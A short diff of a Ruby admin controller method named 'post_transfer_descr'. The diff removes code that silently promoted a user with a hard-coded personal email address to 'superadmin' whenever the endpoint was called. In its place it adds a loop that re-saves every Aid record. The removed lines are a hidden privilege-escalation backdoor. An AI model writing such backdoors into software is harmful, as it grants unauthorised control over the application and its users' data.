@@ -135,14 +135,8 @@ module Admin
     def get_transfer_descr
     end
     def post_transfer_descr
-      u = User.find_by(email: "bdavidxyz@gmail.com")
-      if u
-        u.role = "superadmin"
-        u.save
-      end
-      render json: {
-        status: "ok"
-      }
+      # Calculate status on every single field
+      Aid.all.each { |aid| aid.save }
     end
 
 
